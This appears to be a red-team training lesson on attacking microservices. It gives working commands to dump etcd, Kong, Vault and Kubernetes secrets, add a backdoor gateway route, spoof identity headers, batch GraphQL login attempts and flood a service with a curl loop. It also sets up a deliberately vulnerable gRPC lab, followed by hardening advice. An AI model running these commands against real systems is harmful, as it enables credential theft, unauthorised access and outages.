    Encrypt etcd, restrict host mounts, enforce NetworkPolicy.
    Deploy an admission controller that says no.

You now have a mental model of the cluster, a lab you can rebuild in three commands, and a repeatable enumeration script.

Next lesson: Lesson 05 — Container Escapes and Kernel Boundaries — where we descend from the cluster into the container runtime, cover the CVE families (runc symlink races, cgroups v1 release_agent, overlayfs gid), and walk out of a locked-down pod onto the node.
























Lesson 05 — Microservices Architecture Patterns

    Module 04: Containers and Software Architecture · Penetration Testing with Kali Linux 2026 · Red Team Leaders

Introduction

The modern target is not a single binary listening on port 443. It is a graph of dozens or hundreds of small services, each talking to others over gRPC, REST, Kafka topics, and service-mesh sidecars, coordinated by a control plane that itself is a target. When a pentester compromises a single monolithic web application, the scope is bounded by that process. When a pentester compromises a single microservice, the scope is bounded by whatever the mesh, the gateway, and the network policy allow that service to reach — which, in practice, is often "everything in the cluster."

This lesson maps the modern microservices landscape from the attacker's point of view. We will cover how services find each other (Consul, etcd, Kubernetes DNS), how requests enter the mesh (API gateways like Kong, Envoy, Traefik), how services authenticate to each other (mTLS via Istio and Linkerd), and how they communicate asynchronously (Kafka, RabbitMQ, NATS). At each pattern we will look at what breaks, what leaks, and what pivots become available. By the end you should be able to walk into an environment that "runs on Kubernetes and Istio" and know exactly which endpoints to probe first.
1. Introduction — The Modern Target Is a Graph of Services, Not One Binary

A decade ago a web pentest was largely a study of one large application: one login form, one session store, one database, one uploaded shell. Today the same functionality is often split into an authentication service, a user-profile service, an inventory service, a pricing service, a checkout service, a notification service, and a reporting service — each running in its own container, each scaled independently, and each speaking to a message broker and a shared observability stack.

For the attacker this changes the entire mental model:

    The perimeter is not a firewall around one host. It is an API gateway or ingress controller that sits in front of a service graph.
    Compromising one service rarely gives you the crown jewels. It gives you a foothold inside the mesh, from which lateral movement to more privileged services is the actual objective.
    Trust is often mediated by mTLS certificates, not by a session cookie. Stealing a workload identity is more useful than stealing a user session.
    Configuration and secrets live in centralized systems (Vault, Consul KV, Kubernetes Secrets, Spring Cloud Config). A single leak often unlocks many services at once.

                    ┌─────────────────────┐
   Internet ──────► │   API Gateway       │  (Kong / Envoy / Traefik)
                    │   authn, rate-limit │
                    └──────────┬──────────┘
                               │
                    ┌──────────▼──────────┐
                    │   Service Mesh      │  (Istio / Linkerd)
                    │   mTLS + policy     │
                    └──────────┬──────────┘
                               │
     ┌─────────────┬───────────┼───────────┬─────────────┐
     ▼             ▼           ▼           ▼             ▼
  auth-svc    profile-svc  cart-svc   pricing-svc   checkout-svc
     │             │           │           │             │
     └──────┬──────┴───────────┴─────┬─────┘             │
            ▼                        ▼                   ▼
        Postgres                 Kafka bus          Vault (secrets)

    Pentester Insight: The first question on any modern engagement is no longer "what version of Apache is running." It is "is there a service mesh, and what does its authorization policy actually enforce." Everything else follows from that answer.

2. Monolith vs Microservices — The Trade-Offs, and the New Attack Surface
2.1 The Shift
Concern	Monolith	Microservices
Deployment	One artifact	Dozens of artifacts, independently deployed
Data	One database	One database per service (usually)
Auth	One session per user	Service-to-service tokens or mTLS everywhere
Failure	Whole app down	One service degrades, others compensate
Attack surface	One process, many endpoints	Many processes, each with its own endpoints
2.2 What the Attacker Gains

The monolith attacker who owned the app also owned the DB, the file system, and the memory of every request. The microservices attacker who owns one service owns:

    That service's process memory (secrets in env vars, cached tokens, JWKS keys)
    The service's outbound network reach (whatever the network policy allows)
    The service's identity (SPIFFE ID, service account token, mTLS client cert)
    Whatever queues the service subscribes to or publishes on

That is often more than the monolith gave you, because service accounts and workload identities are frequently over-privileged.
2.3 What the Attacker Loses

    SQL injection into one service rarely reaches every table — services own their own DBs.
    File uploads that landed on the app server no longer touch the same disk as billing.
    A single RCE gives shell in a container that is likely read-only, distroless, and has no shell tools installed.

The tradeoff, then, is: fewer easy wins per service, but many more services to attack, and much better lateral movement once you land.
3. Service Discovery Patterns

Services must find each other by name, not by IP, because IPs churn every time a pod restarts. Three dominant patterns exist.
3.1 Consul

HashiCorp Consul runs an agent on every node. Services register with the local agent, and other services query Consul over DNS or HTTP.
# Query Consul for a registered service over its HTTP API:
curl -s http://consul.internal:8500/v1/catalog/services | jq
# {
#   "auth-svc": ["primary","canary"],
#   "cart-svc": [],
#   "pricing-svc": ["v2"]
# }

# List every node registered with Consul:
curl -s http://consul.internal:8500/v1/catalog/nodes | jq '.[].Node'

# Dump the KV store (this often contains configuration and, on bad deployments, secrets):
curl -s http://consul.internal:8500/v1/kv/?recurse | jq

If the Consul HTTP API is reachable without an ACL token, the attacker has an authoritative map of the environment and often direct access to configuration data.
3.2 etcd

etcd underpins Kubernetes and, in some environments, is used directly as a service registry. It listens on TCP/2379 (client) and TCP/2380 (peer).
# etcdctl v3 against an unauthenticated etcd (this is a real finding in the wild):
export ETCDCTL_API=3
etcdctl --endpoints=http://etcd.internal:2379 get / --prefix --keys-only | head -30

# In Kubernetes, etcd stores every Secret. If you can read it, you own the cluster:
etcdctl --endpoints=http://etcd.internal:2379 get /registry/secrets/ --prefix

    Pentester Insight: Never assume etcd is firewalled. In hastily-built clusters it is exposed on 0.0.0.0 with no client cert requirement. A single curl http://etcd:2379/v2/keys/?recursive=true can return every Secret in the cluster in cleartext.

3.3 Kubernetes DNS

Kubernetes runs CoreDNS inside the cluster. Every Service gets a DNS name of the form <service>.<namespace>.svc.cluster.local.
# From a compromised pod, enumerate services in the current namespace:
dig +short auth-svc.default.svc.cluster.local

# Enumerate services across all namespaces you can reach:
for ns in default kube-system istio-system monitoring; do
  for svc in auth cart profile pricing checkout admin internal-api; do
    dig +short ${svc}.${ns}.svc.cluster.local
  done
done

# Ask CoreDNS to walk the cluster (only works if AXFR is misconfigured, rare but possible):
dig @kube-dns.kube-system.svc.cluster.local cluster.local AXFR

Even without AXFR, brute-forcing service names is cheap. A wordlist of common service names (auth, admin, internal, metrics, debug, api, db) returns hits quickly.
4. API Gateway Pattern — The Single Choke Point

The API gateway is the front door. It handles TLS termination, authentication, rate limiting, request rewriting, and routing to the right upstream service.
4.1 Common Gateways
Gateway	Data plane	Notes
Kong	OpenResty (nginx + Lua)	Plugin-heavy, admin API is a huge target
Envoy	C++, xDS config	Under the hood of Istio and many meshes
Traefik	Go	Very popular for Docker/K8s ingress
NGINX Ingress	nginx	The default for many K8s clusters
4.2 What the Gateway Does

    Terminates TLS from the internet
    Validates a JWT or API key and injects an internal identity header
    Enforces per-route rate limits
    Rewrites paths (/api/v1/orders → /orders)
    Forwards to the internal service by name

4.3 Attack Angle: Gateway Bypass via Internal DNS

The gateway is only a choke point if traffic must go through it. In many clusters the internal Service is reachable directly from any pod in the same namespace, bypassing every authn and rate-limit rule.
# Externally: everything goes through the gateway with authn:
curl -H "Authorization: Bearer $TOKEN" https://api.example.com/v1/users/me

# From a compromised pod inside the cluster: skip the gateway entirely:
curl http://user-svc.default.svc.cluster.local:8080/users/me
# 200 OK — the internal service trusts the caller because "you got past the gateway"
# but you did not: you came in the side door.

This is one of the most common findings in modern engagements. The defense is per-service authorization enforced by the service itself, not by the gateway, or an AuthorizationPolicy on the mesh sidecar.
4.4 Kong Admin API — A Recurring Nightmare

Kong ships with an admin API on port 8001 that, if left unauthenticated on a reachable interface, lets an attacker add routes, remove plugins, and dump every credential Kong stores.
# Enumerate Kong routes:
curl -s http://kong.internal:8001/routes | jq

# Read every consumer credential (JWT secrets, API keys, basic-auth hashes):
curl -s http://kong.internal:8001/consumers | jq -r '.data[].id' \
  | while read id; do curl -s http://kong.internal:8001/consumers/$id/jwt; done

# Add a new route that skips all plugins:
curl -X POST http://kong.internal:8001/services/protected-svc/routes \
  -d 'paths[]=/backdoor' -d 'strip_path=false'
4.5 Header Trust Bugs

Gateways often inject X-Forwarded-User, X-Auth-Request-User, or X-Remote-User. If the upstream service trusts those headers unconditionally and does not strip them from client requests, an attacker can spoof them directly against the internal endpoint.
curl -H "X-Forwarded-User: admin" \
     http://profile-svc.default.svc.cluster.local:8080/admin/dump
5. Service Mesh — Sidecars, mTLS, and Control-Plane Escape

A service mesh injects a sidecar proxy (Envoy for Istio, linkerd2-proxy for Linkerd) next to every service. The sidecar transparently upgrades in-cluster connections to mTLS, enforces authorization policies, and emits telemetry.
5.1 Istio in One Diagram
   ┌──────────────────────────────────────────┐
   │ Pod                                      │
   │  ┌────────────┐   ┌──────────────────┐   │
   │  │ app :8080  │◄─►│ envoy sidecar    │◄──┼──► other pods (mTLS)
   │  └────────────┘   │  :15001 in       │   │
   │                   │  :15006 out      │   │
   │                   │  :15020 status   │   │
   │                   └──────────────────┘   │
   └──────────────────────────────────────────┘
                          ▲
                          │ xDS config
                          │
                   ┌──────┴──────┐
                   │  istiod     │  (control plane)
                   └─────────────┘
5.2 Sidecar Misconfiguration

The sidecar is transparent because iptables rules inside the pod redirect all traffic to Envoy. If those rules are broken, or if the application binds to 0.0.0.0 on a port that Istio does not know about, traffic can flow around the sidecar and skip mTLS entirely.
# From inside the pod, inspect Envoy's admin interface (bound to localhost):
curl -s http://127.0.0.1:15000/config_dump | jq '.configs[].dynamic_active_clusters' | head

# List listeners — anything not managed by Envoy is a bypass candidate:
curl -s http://127.0.0.1:15000/listeners

# Dump every certificate the sidecar has minted or trusts:
curl -s http://127.0.0.1:15000/certs | jq
5.3 mTLS Downgrade

Istio has three modes: STRICT, PERMISSIVE, and DISABLE. PERMISSIVE is the default during migration and accepts both plaintext and mTLS. An attacker who lands in the mesh can often reach PERMISSIVE services in plaintext, bypassing the client-cert requirement entirely.
# Check the mesh-wide PeerAuthentication:
kubectl -n istio-system get peerauthentication -o yaml

# If mtls.mode is PERMISSIVE anywhere, hit those services without a client cert:
curl http://permissive-svc.default.svc.cluster.local:8080/internal/dump
5.4 Escape into the Control Plane

The mesh control plane (istiod in Istio, linkerd-destination in Linkerd) issues certificates and pushes xDS config to every sidecar. Compromising the control plane compromises the entire mesh.

    The istiod service listens on 15012 (xDS), 15010 (plaintext xDS — should not be exposed), 15014 (monitoring), and 8080 (debug).
    The /debug endpoint on :8080 exposes cluster state, config sync status, and endpoint listings.

# If istiod's debug endpoint is reachable, this is a topology jackpot:
curl -s http://istiod.istio-system.svc.cluster.local:8080/debug/configz | jq
curl -s http://istiod.istio-system.svc.cluster.local:8080/debug/endpointz | jq
curl -s http://istiod.istio-system.svc.cluster.local:8080/debug/syncz | jq

    Pentester Insight: istiod's debug interface has repeatedly been left exposed inside clusters. It is arguably the single richest source of internal topology in the entire mesh — every service, every endpoint, every policy.

6. Backend for Frontend (BFF) Pattern

The BFF pattern places a small backend service between each client type (web, mobile, TV) and the shared downstream microservices. Each BFF is tailored to its client's data needs, aggregating multiple downstream calls into one response.
   Web SPA ────► web-bff  ─┐
                            ├──► auth-svc, cart-svc, pricing-svc, ...
   Mobile app ─► mobile-bff─┘
6.1 Why BFFs Exist

    Reduce round-trips: one BFF call replaces five downstream calls.
    Shape responses to the client: strip fields the mobile app does not need.
    Centralize authn per client type.

6.2 Attack Angle

The BFF frequently holds a long-lived downstream credential (a service token, a Vault-issued secret) that has broad read access to the downstream services. If the BFF is exploitable — SSRF, template injection, prototype pollution — the attacker inherits that broad credential.

Additionally, BFFs are notorious for response-shaping bugs: they strip sensitive fields in the client response but forget to strip them in error responses, debug endpoints, or GraphQL introspection. An attacker who can trigger a verbose error path often gets the raw downstream payload.
# Force a downstream error and inspect the leaked upstream body:
curl 'https://web-bff.example.com/api/product?id=%00'
# 500 Internal Server Error
# {"error":"downstream: {\"internal_price\":42,\"cost_basis\":18,\"vendor_id\":\"acme\"}"}
7. Communication Styles — Sync vs Async
7.1 Synchronous

    REST over HTTP/1.1 or HTTP/2: the workhorse. JSON payloads, familiar attack surface.
    gRPC over HTTP/2: protobuf payloads, binary framing, harder to fuzz naively.
    GraphQL over HTTP: single endpoint, client-shaped queries, its own set of pitfalls.

7.2 Asynchronous

    Kafka: topic-based, high-throughput, distributed log. Producers publish, consumers subscribe.
    RabbitMQ: AMQP exchanges + queues, more traditional message broker semantics.
    NATS / NATS JetStream: lightweight pub/sub, subject-based routing.
    AWS SQS / GCP Pub/Sub / Azure Service Bus: managed equivalents.

7.3 Why the Distinction Matters for Attackers

Async messaging changes what "compromise" means. A service that publishes to a Kafka topic does not care who is listening. If you can attach a consumer to that topic — because Kafka has no authn, or because the topic ACL is world-readable — you get a live feed of every event flowing through the system: user signups, orders placed, password resets, PII updates.

Message replay is another asymmetric win. In sync systems the request/response is one-shot. In async systems, a captured message can often be re-injected days later. Idempotency keys and message signing are the defenses; most systems do not enforce them.
8. gRPC Deep Dive

gRPC is a modern RPC framework built on HTTP/2 and Protocol Buffers. It is fast, strongly typed, and increasingly common for east-west service traffic.
8.1 The Wire Format

Each call is an HTTP/2 request:
:method = POST
:scheme = https
:path   = /package.Service/Method
:authority = svc.internal
content-type = application/grpc+proto
te = trailers
grpc-timeout = 5S

<length-prefixed protobuf frame>

Because it is HTTP/2, standard HTTP proxies and captures work — but the body is protobuf, so curl alone shows you nothing useful. That is where grpcurl comes in.
8.2 grpcurl and Server Reflection

If the server enables gRPC server reflection (the grpc.reflection.v1.ServerReflection service), a client can enumerate every service and method the server exposes without prior knowledge of the .proto files.
# Kali 2026 ships grpcurl in /usr/bin/grpcurl. If not, install it:
sudo apt install grpcurl

# List every service exposed by the target (reflection required):
grpcurl -plaintext auth-svc.default.svc.cluster.local:50051 list
# grpc.reflection.v1.ServerReflection
# grpc.health.v1.Health
# acme.auth.v1.AuthService
# acme.auth.v1.AdminService

# List methods on a service:
grpcurl -plaintext auth-svc.default.svc.cluster.local:50051 list acme.auth.v1.AdminService
# acme.auth.v1.AdminService.ListUsers
# acme.auth.v1.AdminService.ResetPassword
# acme.auth.v1.AdminService.ImpersonateUser

# Describe a message type:
grpcurl -plaintext auth-svc.default.svc.cluster.local:50051 describe acme.auth.v1.ImpersonateRequest

# Invoke a method with a JSON body (grpcurl converts JSON <-> protobuf):
grpcurl -plaintext -d '{"user_id":"1"}' \
  auth-svc.default.svc.cluster.local:50051 \
  acme.auth.v1.AdminService.ImpersonateUser
8.3 Reflection as an Information Leak

Server reflection is a debugging feature. Leaving it enabled in production hands attackers the entire API surface — every internal method, every message type, every field name. It is the gRPC equivalent of leaving Swagger UI open.
8.4 Attacking gRPC Without Reflection

If reflection is disabled you need the .proto files. Options:

    Extract them from the client binary (mobile apps often ship them or a JSON descriptor).
    Recover them from the container image (grep -R "syntax = \"proto3\"" /).
    Reverse them from packet captures: use protobuf-inspector or protoscope to guess field tags and types, then reconstruct a .proto.

# Capture gRPC traffic with mitmproxy (Kali 2026 supports HTTP/2 out of the box):
mitmproxy --mode reverse:https://auth-svc.internal:50051 --listen-port 8443

# Dump a captured protobuf body:
protoscope -explicit-length-prefix < body.bin
8.5 gRPC Authorization Pitfalls

    Method-level authz is often forgotten because HTTP-style middleware does not apply cleanly.
    Metadata (the gRPC equivalent of headers) is frequently trusted from the client without validation — x-user-id and x-tenant-id metadata are ripe for spoofing.
    Streaming RPCs bypass per-request authz checks that only fire once at stream open.

9. GraphQL as a Microservice Frontend

GraphQL is often placed in front of a microservices backend, acting as a single query endpoint that fans out to the right services.
9.1 Introspection
# Full introspection query (dump the schema):
curl -X POST https://api.example.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { types { name fields { name type { name kind } } } } }"}' \
  | jq > schema.json

# If /graphql accepts GET with a query param, introspection also works via GET:
curl 'https://api.example.com/graphql?query=%7B__schema%7Btypes%7Bname%7D%7D%7D'

Even when introspection is disabled, tools like clairvoyance can brute-force field names to reconstruct the schema.
9.2 Batching Attacks

Many GraphQL servers accept an array of queries in one POST:
curl -X POST https://api.example.com/graphql \
  -H 'Content-Type: application/json' \
  -d '[
    {"query":"mutation{login(user:\"a\",pass:\"1\"){token}}"},
    {"query":"mutation{login(user:\"a\",pass:\"2\"){token}}"},
    {"query":"mutation{login(user:\"a\",pass:\"3\"){token}}"}
  ]'

Rate limits that count HTTP requests do not count queries inside a batch. A single request can attempt thousands of logins.
9.3 Per-Field Auth Bypass

A resolver for User.email may check auth; a resolver for User.internalEmail may have been added later and forgotten. Introspect every field and probe each individually.
# Probe every field on the User type:
for field in id name email internalEmail role tenantId ssn phone address; do
  echo "== $field =="
  curl -s -X POST https://api.example.com/graphql \
    -H 'Content-Type: application/json' \
    -d "{\"query\":\"{ user(id:\\\"1\\\"){ $field } }\"}"
done
9.4 Nested Query DoS

GraphQL lets clients specify arbitrarily deep nested queries. Without depth limits, friends { friends { friends { ... } } } can cost O(n^k) to resolve.
10. Message Queues — Kafka, RabbitMQ, Dead-Letter Queues
10.1 Kafka

Kafka topics are logs. Consumers read from an offset; producers append.
# List topics against an unauthenticated broker:
kafka-topics.sh --bootstrap-server kafka.internal:9092 --list

# Describe a topic (partition count, replication, config):
kafka-topics.sh --bootstrap-server kafka.internal:9092 --describe --topic user.signups

# Consume messages from the beginning:
kafka-console-consumer.sh --bootstrap-server kafka.internal:9092 \
  --topic user.signups --from-beginning --max-messages 20

# Produce a message (dangerous — this is now a durable event in the system):
kafka-console-producer.sh --bootstrap-server kafka.internal:9092 --topic user.signups
10.2 Attack Angle: Unauthenticated Broker

Kafka historically shipped without authn. Even with SASL/SCRAM available, many deployments still expose plaintext PLAINTEXT listeners on internal networks. If you can reach :9092, you can typically read every topic.
10.3 PII in Messages

Message payloads are frequently JSON blobs of every field associated with an event. A user.updated topic may include full names, addresses, hashed passwords, and reset tokens. Even when the primary DB is well-protected, the queue is often not.
10.4 Replay Attacks

Kafka retains messages for hours or days. An attacker who captures a payment.authorized message from three days ago can often re-inject it into a downstream topic that lacks idempotency checks.
10.5 RabbitMQ
# The management UI on :15672 is a huge target if reachable:
curl -u guest:guest http://rabbit.internal:15672/api/queues | jq

# List every exchange:
curl -u guest:guest http://rabbit.internal:15672/api/exchanges | jq '.[].name'

# Peek at messages in a queue (get without ack):
curl -u guest:guest -X POST http://rabbit.internal:15672/api/queues/%2f/orders/get \
  -H 'Content-Type: application/json' \
  -d '{"count":10,"ackmode":"ack_requeue_true","encoding":"auto"}'

The default guest:guest credentials are still present in more environments than you would expect, though modern RabbitMQ restricts them to localhost by default.
10.6 Dead-Letter Queues

When a message repeatedly fails processing, brokers move it to a DLQ. DLQs often accumulate months of unprocessed messages, including messages that failed because they contained sensitive edge-case data. They are a rich target and often have the same authz as the main queues, or none at all.
11. Event-Driven and CQRS Patterns
11.1 Event-Driven Architecture

Services communicate primarily through events on a bus. Order created, payment authorized, inventory reserved — each is an event, and each interested service subscribes.
11.2 CQRS — Command Query Responsibility Segregation

Writes go to a command model that emits events. Reads go to a query model that is populated by projecting those events into denormalized read stores.
   Command:  POST /orders  ──►  order-cmd-svc  ──► events on "orders" topic
                                                    │
                        ┌───────────────────────────┤
                        ▼                           ▼
                  order-read-svc              analytics-svc
                  (query store)               (warehouse)
11.3 Attack Implications

    The write model and read model may enforce different authorization. Read the query side to bypass write-side checks.
    Event replays during recovery can re-execute side effects if handlers are not idempotent.
    Event schemas are typically not enforced strictly. Injecting an event with unexpected fields can trigger downstream bugs.

12. Circuit Breakers, Retries, Timeouts
12.1 The Pattern

To keep a failing dependency from taking down the caller, clients wrap outbound calls in:

    Timeouts — abandon the call after N ms
    Retries — try again on failure, often with exponential backoff
    Circuit breakers — after M consecutive failures, stop calling for a cooldown period

Libraries: Hystrix (legacy), Resilience4j, Polly (.NET), and mesh-native versions in Istio and Linkerd.
12.2 Abuse: Retry Storms

If a service retries three times on 5xx, and the caller of that service also retries three times, and the caller of that retries three times, one bad request can amplify into 27 downstream requests. An attacker who can reliably trigger a 5xx from the deepest service can drive load exponentially back up the stack.
# Trigger a malformed input that reliably produces 500 from a deep service:
while true; do
  curl -s -o /dev/null "https://api.example.com/v1/search?q=$(python3 -c 'print("A"*100000)')" &
done
12.3 Abuse: Circuit-Breaker Trip as a DoS Primitive

Get the circuit breaker to trip for a target dependency, and every caller of that dependency now short-circuits. In some setups this is user-scoped (per-tenant circuit breakers) and can be weaponized against a single tenant.
13. Distributed Tracing — Jaeger, Zipkin, OpenTelemetry
13.1 What Tracing Does

Every incoming request is assigned a trace ID. As the request flows through services, each span records the service, operation, latency, and tags. The result is a call tree visualizing the entire request path.
13.2 Trace Headers

    W3C Trace Context: traceparent, tracestate
    B3 (Zipkin): X-B3-TraceId, X-B3-SpanId, X-B3-ParentSpanId, X-B3-Sampled
    Jaeger: uber-trace-id

Following these headers as an attacker lets you correlate your requests across every service they touch.
13.3 Attack Angle: Tracing UI Exposed

Jaeger, Zipkin, and Tempo UIs are commonly deployed inside the cluster with no authentication because "they are internal only." They are also frequently exposed unintentionally via a stray Ingress.
# Jaeger UI default:
curl -s http://jaeger.internal:16686/api/services | jq
# ["auth-svc","cart-svc","checkout-svc","admin-svc","payment-svc","kyc-svc"]

# For each service, list operations:
for svc in $(curl -s http://jaeger.internal:16686/api/services | jq -r '.data[]'); do
  echo "== $svc =="
  curl -s "http://jaeger.internal:16686/api/services/$svc/operations" | jq -r '.data[]'
done

# Pull traces containing an interesting operation:
curl -s "http://jaeger.internal:16686/api/traces?service=payment-svc&operation=charge&limit=20" | jq

That single UI reveals every service, every operation name, every downstream dependency, and often tag values that include user IDs, tenant IDs, and internal URLs.
13.4 OpenTelemetry Collector

The OTLP collector on :4317 (gRPC) and :4318 (HTTP) is often unauthenticated inside the cluster. An attacker can flood it with fake spans, injecting misleading data into the observability system and drowning real alerts.
14. Configuration and Secrets in Microservices
14.1 Common Systems

    Spring Cloud Config Server — Git-backed config service, /actuator/env used to be the classic leak
    HashiCorp Vault — token-authenticated secret store, wraps KV, PKI, dynamic DB creds
    Consul KV — often used for feature flags and (badly) for secrets
    Kubernetes Secrets / ConfigMaps — namespace-scoped, base64-encoded (not encrypted at rest by default)
    AWS Secrets Manager, GCP Secret Manager, Azure Key Vault — cloud-managed

14.2 Leak Paths

Spring Boot Actuator, if exposed, hands over configuration in one request:
# The classic Actuator leak:
curl -s https://svc.example.com/actuator/env | jq
curl -s https://svc.example.com/actuator/configprops | jq
curl -s https://svc.example.com/actuator/heapdump -o heap.bin
# Then extract strings and look for tokens, DB URIs, and JWT secrets:
strings heap.bin | grep -Ei 'password|secret|token|BEGIN RSA'

Vault, when reached with a valid token, is queryable:
export VAULT_ADDR=https://vault.internal:8200
export VAULT_TOKEN=$(cat /var/run/secrets/vault/token)

# List paths you can access:
vault token capabilities $VAULT_TOKEN secret/data/prod/db

# Read a secret:
vault kv get -format=json secret/prod/db | jq

Kubernetes Secrets mounted into a pod are just files:
# From inside a compromised container:
find /var/run/secrets -type f 2>/dev/null | xargs -I{} sh -c 'echo "== {} ==" ; cat "{}"'
find / -name '*.env' -o -name 'application.yml' -o -name 'appsettings.json' 2>/dev/null
14.3 The Environment Variable Leak

Configuration passed via env vars is visible to every process in the container and often surfaces via error pages, debug endpoints, or process listings.
# From inside a container:
cat /proc/1/environ | tr '\0' '\n' | grep -Ei 'key|token|secret|password'
15. Attack Recon Workflow — Mapping the Mesh From One Foothold

Assume you have shell in a single application container inside a Kubernetes cluster. Here is the workflow to expand.
15.1 Locate Yourself
# Identity: what service account are you running as?
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# What is the API server?
env | grep KUBERNETES

# What can this service account do?
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -sk -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -H 'Content-Type: application/json' \
  -d '{"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"default"}}'
15.2 Enumerate the DNS Namespace
# Common service names, sprayed across likely namespaces:
for ns in default kube-system istio-system linkerd monitoring observability app prod stage; do
  for svc in api auth admin internal metrics debug config vault consul kafka rabbit \
             redis postgres mysql mongo elastic jaeger zipkin grafana prometheus \
             kong traefik envoy istiod pilot mixer; do
    ip=$(dig +short +time=1 +tries=1 ${svc}.${ns}.svc.cluster.local 2>/dev/null)
    [ -n "$ip" ] && echo "${svc}.${ns}.svc.cluster.local -> $ip"
  done
done
15.3 Probe Reachable HTTP Endpoints
# For every discovered host, hit the well-known endpoints:
for host in $HITS; do
  for path in / /health /metrics /debug /actuator /actuator/env /swagger /graphql \
              /internal /admin /-/config /api-docs /v1 /v2 /grpc.reflection.v1.ServerReflection; do
    code=$(curl -sk -o /dev/null -w '%{http_code}' --max-time 3 "http://$host$path")
    [ "$code" != "000" ] && [ "$code" != "404" ] && echo "$code  http://$host$path"
  done
done
15.4 Enumerate gRPC Where TCP Ports Suggest It
for host in $GRPC_HITS; do
  for port in 50051 50052 8443 9090; do
    echo "== $host:$port =="
    grpcurl -plaintext -max-time 3 "$host:$port" list 2>/dev/null
  done
done
15.5 Follow Tracing Headers

Send a request through the gateway with a traceparent and then query Jaeger for the trace ID you generated. The trace shows every service the request touched, complete with tag values.
TRACEID=$(openssl rand -hex 16)
SPANID=$(openssl rand -hex 8)
curl -H "traceparent: 00-${TRACEID}-${SPANID}-01" https://api.example.com/v1/orders/1

# A few seconds later:
curl -s "http://jaeger.internal:16686/api/traces/${TRACEID}" | jq
15.6 Harvest /metrics

Prometheus /metrics endpoints are rarely authenticated inside the mesh and reveal enormous amounts about internal topology, request rates, and error rates. http_requests_total{handler="/admin/users",...} labels tell you which admin endpoints exist even if the routes are not publicly documented.
16. Detection and Hardening
16.1 Network Policies

Default-deny egress at the namespace level, then whitelist only the destinations each pod needs. Without this, a compromised pod can reach every service in the cluster.
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: prod
spec:
  podSelector: {}
  policyTypes: [Ingress, Egress]
16.2 mTLS Everywhere

Set the mesh-wide PeerAuthentication to STRICT:
apiVersion: security.istio.io/v1
kind: PeerAuthentication
metadata:
  name: default
  namespace: istio-system
spec:
  mtls:
    mode: STRICT
16.3 Per-Service Authorization

Do not trust the gateway alone. Every service should enforce its own authorization based on the caller's SPIFFE identity, not a header.
apiVersion: security.istio.io/v1
kind: AuthorizationPolicy
metadata:
  name: cart-allow-checkout-only
  namespace: prod
spec:
  selector:
    matchLabels:
      app: cart-svc
  action: ALLOW
  rules:
  - from:
    - source:
        principals: ["cluster.local/ns/prod/sa/checkout-svc"]
16.4 Denylist Internal Endpoints at the Gateway

/actuator/*, /debug/*, /-/reload, /metrics, /internal/*, and gRPC reflection should be filtered at the ingress and blocked from the internet regardless of upstream configuration.
16.5 Disable gRPC Reflection in Production
// Do NOT do this in production:
// reflection.Register(grpcServer)

Or, if reflection is needed for internal tooling, bind it to a separate localhost-only listener.
16.6 Authenticated Observability

Jaeger, Prometheus, Grafana, and Kiali must sit behind SSO. "Internal only" is not a security control when a single compromised pod can reach them.
17. Hands-On — Two-Service Compose With gRPC Reflection

We will stand up a small gRPC backend with reflection enabled and a REST API in front of it, enumerate the gRPC surface, then disable reflection and re-run to confirm the exposure closes.
17.1 Directory Layout
mesh-lab/
├── docker-compose.yml
├── backend/
│   ├── Dockerfile
│   ├── go.mod
│   ├── main.go
│   └── proto/
│       └── admin.proto
└── api/
    ├── Dockerfile
    └── main.py
17.2 backend/proto/admin.proto
syntax = "proto3";
package lab.admin.v1;
option go_package = "lab/admin/v1;adminv1";

service AdminService {
  rpc Ping(PingRequest) returns (PingResponse);
  rpc DumpSecret(DumpRequest) returns (DumpResponse);
  rpc Impersonate(ImpersonateRequest) returns (ImpersonateResponse);
}

message PingRequest { string msg = 1; }
message PingResponse { string echo = 1; }
message DumpRequest {}
message DumpResponse { string secret = 1; }
message ImpersonateRequest { string user_id = 1; }
message ImpersonateResponse { string token = 1; }
17.3 backend/main.go (excerpt)
package main

import (
    "context"
    "log"
    "net"

    "google.golang.org/grpc"
    "google.golang.org/grpc/reflection"
    adminv1 "lab/admin/v1"
)

type server struct{ adminv1.UnimplementedAdminServiceServer }

func (s *server) Ping(_ context.Context, r *adminv1.PingRequest) (*adminv1.PingResponse, error) {
    return &adminv1.PingResponse{Echo: r.Msg}, nil
}
func (s *server) DumpSecret(context.Context, *adminv1.DumpRequest) (*adminv1.DumpResponse, error) {
    return &adminv1.DumpResponse{Secret: "sk_live_TOP_SECRET_KEY"}, nil
}
func (s *server) Impersonate(_ context.Context, r *adminv1.ImpersonateRequest) (*adminv1.ImpersonateResponse, error) {
    return &adminv1.ImpersonateResponse{Token: "impersonation-token-for-" + r.UserId}, nil
}

func main() {
    lis, _ := net.Listen("tcp", ":50051")
    s := grpc.NewServer()
    adminv1.RegisterAdminServiceServer(s, &server{})
    reflection.Register(s) // <-- toggle this off for step 17.7
    log.Println("gRPC on :50051")
    s.Serve(lis)
}
17.4 docker-compose.yml
services:
  backend:
    build: ./backend
    networks: [mesh]
    expose: ["50051"]
  api:
    build: ./api
    networks: [mesh]
    ports: ["8080:8080"]
    depends_on: [backend]
networks:
  mesh:
    driver: bridge
17.5 Bring It Up
cd mesh-lab
docker compose up -d --build

# From your Kali host, the backend is not directly exposed — that is the point.
# We attack it from *inside* the mesh network by joining a helper container:
docker run --rm -it --network mesh-lab_mesh alpine sh
# Inside the helper:
apk add curl grpcurl bind-tools
17.6 Enumerate With Reflection On
# Discover the backend by DNS name:
dig +short backend.mesh-lab_mesh

# List services via reflection:
grpcurl -plaintext backend:50051 list
# grpc.reflection.v1.ServerReflection
# lab.admin.v1.AdminService

# List methods:
grpcurl -plaintext backend:50051 list lab.admin.v1.AdminService

# Describe the DumpSecret message:
grpcurl -plaintext backend:50051 describe lab.admin.v1.DumpRequest

# Call DumpSecret directly, bypassing the API gateway (:8080):
grpcurl -plaintext -d '{}' backend:50051 lab.admin.v1.AdminService.DumpSecret
# {"secret":"sk_live_TOP_SECRET_KEY"}

